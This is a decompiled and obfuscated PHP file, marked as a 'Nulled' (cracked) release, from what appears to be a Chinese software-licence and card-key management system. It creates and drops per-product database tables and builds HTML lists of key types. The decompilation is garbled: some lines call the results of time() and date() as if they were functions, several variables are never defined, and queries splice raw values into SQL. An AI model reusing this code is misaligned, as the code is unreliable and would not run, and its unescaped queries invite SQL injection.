<?php
/*********************/
/*                   */
/*  Dezend for PHP5  */
/*         NWS       */
/*      Nulled.WS    */
/*                   */
/*********************/

function _obfuscate_j4iMi4_Tk42OjIaNkIiGkYs�( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� = 1 )
{
    $_obfuscate_iJGPjJWLj4uLkIqVjYiHh48� = unpack( "C*", "ViewZendSourceCodeIsInvalid!" );
    do
    {
        $_obfuscate_iY2Oh5OGlIqQhpCJi5CMkog� = ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Y�[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4�] << 4 ) + ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Y�[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� + 1] >> 4 );
        $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� += 2;
    } while ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� < 28 );
}

function _obfuscate_jIeRipOPkpCSlY_HjZOKkYo�( )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�;
    $_obfuscate_joyNkZSPj5CNkIiUh4mLk4Y� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft" );
    foreach ( $_obfuscate_joyNkZSPj5CNkIiUh4mLk4Y� as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        time( )( "delete from `kss_z_log_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` where `addtime`<".( time( ) - 86400 * Z_LOG_DAY ), "sync" );
    }
}

function _obfuscate_j4iOio6Jh46TiI6QkY_Hh5U�( )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�;
    $_obfuscate_kZWKiYiOkouSi5OPjI6Vio0� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_config where id=1" );
    if ( $_obfuscate_kZWKiYiOkouSi5OPjI6Vio0�['clear_z_log'] != date( "d" ) )
    {
        date( "d" )( "update kss_tb_config set clear_z_log=".date( "d" )." where `id`=1", "notsync" );
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft " );
    }
    return $_obfuscate_lYeKk46VlJOHkZOGjZGIko8�;
}

function _obfuscate_lImPlIqVi5SQjpOHkIyHi5Q�( $_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�, $_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�, $_obfuscate_h4mRiI2JlYmThoyOjIqQjok� )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�;
    $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� = "";
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "DROP TABLE IF EXISTS `kss_z_cz_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."`", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� .= "删除旧的kss_z_cz_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "CREATE TABLE `kss_z_cz_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."` (`id` int(11) unsigned NOT NULL auto_increment,`addtime` int(10) unsigned NOT NULL,`cztype` tinyint(2) unsigned NOT NULL,`username` varchar(32) character set utf8 collate utf8_bin NOT NULL,`oldcday` decimal(9,2) unsigned NOT NULL,`newcday` decimal(9,2) unsigned NOT NULL,`oldtimes` int(10) unsigned NOT NULL,`newtimes` int(10) unsigned NOT NULL,`keys` varchar(170) character set utf8 collate utf8_bin NOT NULL default '',`tzxguser` varchar(32) character set utf8 collate utf8_bin NOT NULL default '',  PRIMARY KEY  (`id`), KEY `addtime` (`addtime`), KEY `username` (`username`(10))) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='客户帐号时间变更日志' AUTO_INCREMENT=1 ", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� .= "创建新的kss_z_cz_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "DROP TABLE IF EXISTS `kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."`", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� .= "删除旧的kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "CREATE TABLE `kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."` (`id` int(10) unsigned NOT NULL auto_increment,`managerid` smallint(5) unsigned NOT NULL,`keyfix` char(4) character set utf8 collate utf8_bin NOT NULL,`keys` char(6) character set utf8 collate utf8_bin NOT NULL,`keyspassword` char(22) character set utf8 collate utf8_bin NOT NULL,`addtime` int(10) unsigned NOT NULL,`ordernum` char(24) character set utf8 collate utf8_bin NOT NULL,`cday` decimal(8,2) NOT NULL,`linknum` int(4) unsigned NOT NULL default '1',`points` int(8) unsigned NOT NULL default '0',`keyextattr` varchar(100) NOT NULL default '',`tag` varchar(50) character set utf8 collate utf8_bin NOT NULL default '',`islock` tinyint(1) unsigned NOT NULL default '0',`isback` tinyint(1) unsigned NOT NULL default '0',`cztime` int(10) unsigned NOT NULL default '0',`czusername` varchar(32) NOT NULL default '',PRIMARY KEY  (`id`),UNIQUE KEY `keys` (`keys`), KEY `ordernum` (`ordernum`(10)), KEY `keyextattr` (`keyextattr`(10)), KEY `tag` (`tag`(10)), KEY `czusername` (`czusername`(10)), KEY `islock` (`islock`), KEY `isback` (`isback`), KEY `keyfix_uid_cztime` (`keyfix`,`managerid`,`cztime`)) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� .= "创建新的kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "DROP TABLE IF EXISTS `kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle`", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� .= "删除旧的kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle表出错".$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "CREATE TABLE `kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle` (`id` int(10) unsigned NOT NULL auto_increment,`managerid` smallint(5) unsigned NOT NULL,`keyfix` char(4) character set utf8 collate utf8_bin NOT NULL,`keys` char(6) character set utf8 collate utf8_bin NOT NULL,`keyspassword` char(22) character set utf8 collate utf8_bin NOT NULL,`addtime` int(10) unsigned NOT NULL,`ordernum` char(24) character set utf8 collate utf8_bin NOT NULL,`cday` decimal(8,2) NOT NULL,`linknum` int(4) unsigned NOT NULL default '1',`points` int(8) unsigned NOT NULL default '0',`keyextattr` varchar(100) NOT NULL default '',`tag` varchar(50) NOT NULL default '',`islock` tinyint(1) unsigned NOT NULL default '0',`isback` tinyint(1) unsigned NOT NULL default '0',`cztime` int(10) unsigned NOT NULL default '0',`czusername` varchar(32) character set utf8 collate utf8_bin NOT NULL default '',`deltime` int(10) unsigned NOT NULL,`delmid` smallint(5) unsigned NOT NULL,PRIMARY KEY  (`id`),UNIQUE KEY `keys` (`keys`), KEY `ordernum` (`ordernum`(10)), KEY `keyextattr` (`keyextattr`(10)), KEY `tag` (`tag`(10)), KEY `czusername` (`czusername`(10)), KEY `islock` (`islock`), KEY `isback` (`isback`), KEY `deltime` (`deltime`),KEY `keyfix_uid_cztime` (`keyfix`,`managerid`,`cztime`)) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� .= "创建新的kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle表出错".$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "DROP TABLE IF EXISTS `kss_z_log_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."`", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� .= "删除旧的kss_z_log_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "CREATE TABLE `kss_z_log_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."` (`id` int(10) NOT NULL auto_increment,`username` varchar(32) character set utf8 collate utf8_bin NOT NULL,`optype` tinyint(2) unsigned NOT NULL,`clientid` smallint(5) unsigned NOT NULL,`addtime` int(10) unsigned NOT NULL,`ip` bigint(20) unsigned NOT NULL,`pccode` varchar(512) character set utf8 NOT NULL default '',`linecode` varchar(10) character set utf8 NOT NULL default '',`opccode` varchar(512) character set utf8 NOT NULL, `oip` bigint(20) unsigned NOT NULL default '0',PRIMARY KEY  (`id`),KEY `addtime` (`addtime`),KEY `keys` (`username`(10),`optype`,`clientid`)) ENGINE=MyISAM DEFAULT CHARSET=ascii AUTO_INCREMENT=1 ", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� .= "创建新的kss_z_log_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "DROP TABLE IF EXISTS `kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."`", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� .= "删除旧的kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "CREATE TABLE `kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."` (`id` int(10) unsigned NOT NULL auto_increment,`istempuser` tinyint(1) unsigned NOT NULL default '0',`managerid` smallint(5) unsigned NOT NULL default '0',`username` varchar(32) character set utf8 collate utf8_bin NOT NULL,`password` varchar(32) character set utf8 collate utf8_bin NOT NULL,`password2` varchar(32) character set utf8 collate utf8_bin NOT NULL,`cday` decimal(8,2) NOT NULL,`linknum` int(4) unsigned NOT NULL default '1',`points` int(8) NOT NULL default '0',`keyextattr` varchar(100) NOT NULL default '',`islock` int(1) unsigned NOT NULL default '0',`ispause` int(1) unsigned NOT NULL default '0',`pausetime` int(10) unsigned NOT NULL default '0',`hstats` int(10) unsigned NOT NULL default '0',`unlineday` int(10) unsigned NOT NULL default '0',`unlinetimes` int(10) unsigned NOT NULL default '0',`tag` varchar(100) character set utf8 collate utf8_bin NOT NULL default '-',`bdinfo` varchar(100) NOT NULL default '',`linecode` varchar(10) NOT NULL default '',`pccode` varchar(512) NOT NULL default '',`addtime` int(10) unsigned NOT NULL default '0',`starttime` int(10) unsigned NOT NULL default '0',`endtime` int(10) unsigned NOT NULL default '0',`lasttime` int(10) unsigned NOT NULL default '0',`isonline` tinyint(1) unsigned NOT NULL default '0',`lastip` bigint(20) unsigned NOT NULL default '0',`activetimes` int(10) unsigned NOT NULL default '0',`unlocktimes` int(10) unsigned NOT NULL default '0',`unlockday` tinyint(2) unsigned NOT NULL default '0',`cztimes` int(10) unsigned NOT NULL default '0',`isusetestkey` tinyint(1) unsigned NOT NULL default '0',`parentuser` varchar(100) NOT NULL default '',`intro` varchar(50) NOT NULL default '',`updata` varchar(128) NOT NULL default '',PRIMARY KEY  (`id`),KEY `username` (`username`(10)),KEY `managerid` (`managerid`),KEY `tag` (`tag`),KEY `keyextattr` (`keyextattr`),KEY `lasttime` (`lasttime`,`isonline`),KEY `islock` (`islock`),KEY `endtime` (`endtime`)) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� .= "创建新的kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "DROP TABLE IF EXISTS `kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle`", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� .= "删除旧的kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle表出错".$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "CREATE TABLE `kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle` (`id` int(10) unsigned NOT NULL auto_increment,`istempuser` tinyint(1) unsigned NOT NULL default '0',`managerid` smallint(5) unsigned NOT NULL default '0',`username` varchar(32) character set utf8 collate utf8_bin NOT NULL,`password` varchar(32) character set utf8 collate utf8_bin NOT NULL,`password2` varchar(32) character set utf8 collate utf8_bin NOT NULL,`cday` decimal(8,2) NOT NULL,`linknum` int(4) unsigned NOT NULL default '1',`points` int(8) NOT NULL default '0',`keyextattr` varchar(100) NOT NULL default '',`islock` int(1) unsigned NOT NULL default '0',`ispause` int(1) unsigned NOT NULL default '0',`pausetime` int(10) unsigned NOT NULL default '0',`hstats` int(10) unsigned NOT NULL default '0',`unlineday` int(10) unsigned NOT NULL default '0',`unlinetimes` int(10) unsigned NOT NULL default '0',`tag` varchar(100) character set utf8 collate utf8_bin NOT NULL default '-',`bdinfo` varchar(100) NOT NULL default '',`linecode` varchar(10) NOT NULL default '',`pccode` varchar(512) NOT NULL default '',`addtime` int(10) unsigned NOT NULL default '0',`starttime` int(10) unsigned NOT NULL default '0',`endtime` int(10) unsigned NOT NULL default '0',`lasttime` int(10) unsigned NOT NULL default '0',`isonline` tinyint(1) unsigned NOT NULL default '0',`lastip` bigint(20) unsigned NOT NULL default '0',`activetimes` int(10) unsigned NOT NULL default '0',`unlocktimes` int(10) unsigned NOT NULL default '0',`unlockday` tinyint(2) unsigned NOT NULL default '0',`cztimes` int(10) unsigned NOT NULL default '0',`isusetestkey` tinyint(1) unsigned NOT NULL default '0',`parentuser` varchar(100) NOT NULL default '',`intro` varchar(50) NOT NULL default '',`updata` varchar(128) NOT NULL default '',`delmid` smallint(5) unsigned NOT NULL default '0',`deltime` int(10) unsigned NOT NULL default '0',PRIMARY KEY  (`id`),KEY `username` (`username`(10)),KEY `managerid` (`managerid`),KEY `tag` (`tag`),KEY `keyextattr` (`keyextattr`),KEY `lasttime` (`lasttime`,`isonline`),KEY `islock` (`islock`),KEY `endtime` (`endtime`)) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� .= "创建新的kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle表出错".$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    if ( $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� == "" )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� = TRUE;
    }
    return $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk�;
}

function _obfuscate_lIuHjouPkIaTk46Ih5SVjIw�( $_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�, &$_obfuscate_i4eIkYmJiIyQk4iMj4iGh4o� )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�;
    global $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�;
    $_obfuscate_lYuNj46JkoyKjY_IjIiLj4Y� = "0000";
    if ( $_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE� == 0 )
    {
        return "<option value='".$_obfuscate_lYuNj46JkoyKjY_IjIiLj4Y�."'>----暂无卡类----</option>";
    }
    $_obfuscate_iYeIjIaVlYaIj4yTiJWHk40� = $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['pid']( "select * from `kss_tb_keyset` where `pid`=".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['pid']." and `softid`=".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�." and `islock`=0 order by `cday` asc" );
    if ( empty( $_obfuscate_iYeIjIaVlYaIj4yTiJWHk40� ) )
    {
        return "<option value='".$_obfuscate_lYuNj46JkoyKjY_IjIiLj4Y�."'>----暂无卡类----</option>";
    }
    $_obfuscate_j42Hk5GMkZSNj42RipORkI4� = "";
    foreach ( $_obfuscate_iYeIjIaVlYaIj4yTiJWHk40� as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= "<option value='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['prefix']."'";
        $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= " cday='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['cday']."'";
        $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= " points='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['points']."'";
        $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= " linknum='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['linknum']."'";
        $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= "  extattr1='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1']."'>";
        $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['keyname']."--[天".round( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['cday'], 2 )." 点".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['points']." 通道".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['linknum'];
        if ( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1'] != "" )
        {
            $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= " 附属性".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1'];
            $_obfuscate_i4eIkYmJiIyQk4iMj4iGh4o�[$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['prefix']] = $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['keyname']."--[天".round( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['cday'], 2 )." 点".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['points']." 通道".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['linknum']." 附属性".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1'];
        }
        else
        {
            $_obfuscate_i4eIkYmJiIyQk4iMj4iGh4o�[$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['prefix']] = $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['keyname']."--[天".round( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['cday'], 2 )." 点".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['points']." 通道".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['linknum'];
        }
        $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= "]</option>";
    }
    return $_obfuscate_j42Hk5GMkZSNj42RipORkI4�;
}

function _obfuscate_lIeLiY6Gk4aNiY2Si4uJiIs�( $_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�, $_obfuscate_hoyPk5CJiZKVj4iLh5SHkJA� = 0, $_obfuscate_iYiMh4aGkJCJk4qHjIiVi4Y� = 0, $_obfuscate_kIiVkYqGk4aTjoyIiJGGlYo� = FALSE )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�;
    global $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�;
    $_obfuscate_lYuNj46JkoyKjY_IjIiLj4Y� = 0;
    if ( $_obfuscate_iYiMh4aGkJCJk4qHjIiVi4Y� == 2 )
    {
        $_obfuscate_lYuNj46JkoyKjY_IjIiLj4Y� = "";
    }
    if ( $_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE� == 0 )
    {
        return "<option value='".$_obfuscate_lYuNj46JkoyKjY_IjIiLj4Y�."'>----暂无卡类----</option>";
    }
    $_obfuscate_iYeIjIaVlYaIj4yTiJWHk40� = $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['pid']( "select * from `kss_tb_keyset` where `pid`=".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['pid']." and `softid`=".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpE�." and `islock`=0 order by `cday` asc" );
    if ( empty( $_obfuscate_iYeIjIaVlYaIj4yTiJWHk40� ) )
    {
        return "<option value='".$_obfuscate_lYuNj46JkoyKjY_IjIiLj4Y�."'>----暂无卡类----</option>";
    }
    $_obfuscate_j42Hk5GMkZSNj42RipORkI4� = "";
    if ( empty( $_obfuscate_kIiVkYqGk4aTjoyIiJGGlYo� ) )
    {
        $_obfuscate_i4yIjo2QjpCViIqOiYiGkZE� = array( );
        foreach ( $_obfuscate_kIiVkYqGk4aTjoyIiJGGlYo� as $_obfuscate_i4yKj4eSi4mRkIqSkY6Piok� )
        {
            $_obfuscate_i4yIjo2QjpCViIqOiYiGkZE�[$_obfuscate_i4yKj4eSi4mRkIqSkY6Piok�['keygroupid']] = $_obfuscate_i4yKj4eSi4mRkIqSkY6Piok�['keyprice'];
        }
        foreach ( $_obfuscate_iYeIjIaVlYaIj4yTiJWHk40� as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� )
        {
            if ( array_key_exists( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id'], $_obfuscate_i4yIjo2QjpCViIqOiYiGkZE� ) )
            {
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= "<option value=".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id'];
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id'] == $_obfuscate_hoyPk5CJiZKVj4iLh5SHkJA� ? " selected" : "";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= " cday='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['cday']."'";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= " points='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['points']."'";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= " linknum='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['linknum']."'";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= " price='".$_obfuscate_i4yIjo2QjpCViIqOiYiGkZE�[$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']]."'";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= "  extattr1='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1']."'>";
